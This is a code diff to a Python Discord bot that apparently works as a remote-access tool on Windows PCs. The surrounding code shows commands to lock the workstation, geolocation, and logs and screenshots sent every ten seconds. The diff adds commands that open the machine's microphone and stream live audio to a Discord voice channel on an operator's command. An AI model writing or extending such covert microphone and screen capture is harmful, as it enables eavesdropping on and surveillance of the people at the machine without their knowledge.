@@ -85,6 +85,7 @@ import win32service
 import win32event
 import geocoder
 import time
+import pyaudio
 
 # Unique identifier for this PC
 PC_ID = os.getenv('PC_ID', 'default_pc_id')
@@ -99,6 +100,16 @@ auth_code = os.getenv("AUTH_CODE")
 DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
 SPOTIPY_REDIRECT_URI = 'https://localhost:8000'
 
+
+
+# Audio settings
+CHUNK = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 2
+RATE = 44100
+audio_stream = None
+voice_client = None
+is_streaming = False
 
 # Set up Spotify API authentication
 sp_oauth = SpotifyOAuth(client_id=SPOTIPY_CLIENT_ID,
@@ -352,6 +363,79 @@ async def lock_sys(ctx):
     ctypes.windll.user32.LockWorkStation()
     await ctx.send('PC locked.')
 
+
+
+
+@bot.command()
+async def join(ctx):
+    """Command to make the bot join the voice channel."""
+    if ctx.author.voice:
+        channel = ctx.author.voice.channel
+        global voice_client
+        voice_client = await channel.connect()
+        await ctx.send("Joined the voice channel!")
+    else:
+        await ctx.send("You need to join a voice channel first!")
+
+@bot.command()
+async def leave(ctx):
+    """Command to make the bot leave the voice channel."""
+    global voice_client, is_streaming
+    if voice_client:
+        if is_streaming:
+            await voice_stop(ctx)
+        await voice_client.disconnect()
+        voice_client = None
+        await ctx.send("Disconnected from the voice channel.")
+    else:
+        await ctx.send("I'm not in a voice channel.")
+
+@bot.command(name="voice_start")
+async def voice_start(ctx):
+    """Start streaming live audio to the voice channel."""
+    global audio_stream, voice_client, is_streaming
+
+    if not voice_client:
+        await ctx.send("The bot is not connected to a voice channel.")
+        return
+
+    if is_streaming:
+        await ctx.send("Audio streaming is already in progress.")
+        return
+
+    audio = pyaudio.PyAudio()
+    audio_stream = audio.open(format=FORMAT,
+                              channels=CHANNELS,
+                              rate=RATE,
+                              input=True,
+                              frames_per_buffer=CHUNK)
+    is_streaming = True
+
+    await ctx.send("Started streaming audio. Use `!voice_stop` to stop.")
+
+    # Stream audio to the voice channel
+    while is_streaming:
+        data = audio_stream.read(CHUNK, exception_on_overflow=False)
+        if voice_client and voice_client.is_connected():
+            voice_client.send_audio_packet(data)
+        await asyncio.sleep(0.01)
+
+@bot.command(name="voice_stop")
+async def voice_stop(ctx):
+    """Stop streaming live audio."""
+    global audio_stream, is_streaming
+
+    if not is_streaming:
+        await ctx.send("Audio streaming is not in progress.")
+        return
+
+    is_streaming = False
+    if audio_stream:
+        audio_stream.stop_stream()
+        audio_stream.close()
+        audio_stream = None
+
+    await ctx.send("Stopped streaming audio.")
 
 
 #set playload 
@@ -1230,7 +1314,6 @@ async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
 
         # Schedule the next execution of the coroutine after 10 seconds
         await asyncio.sleep(10)
-
 
 
 
